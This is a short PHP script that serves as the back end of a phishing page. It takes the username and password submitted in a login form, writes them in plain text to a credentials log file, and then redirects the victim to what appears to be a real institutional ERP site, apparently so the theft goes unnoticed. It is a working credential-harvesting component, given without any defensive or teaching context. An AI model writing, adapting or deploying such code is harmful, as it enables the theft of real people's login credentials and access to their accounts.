<?php
    // Get POST data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log to file
    $file = fopen("LOGS/credentials.log", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // Optional: Redirect user to real site (e.g., Facebook)
    header("Location: https://erp.pict.edu");
    exit();
?>
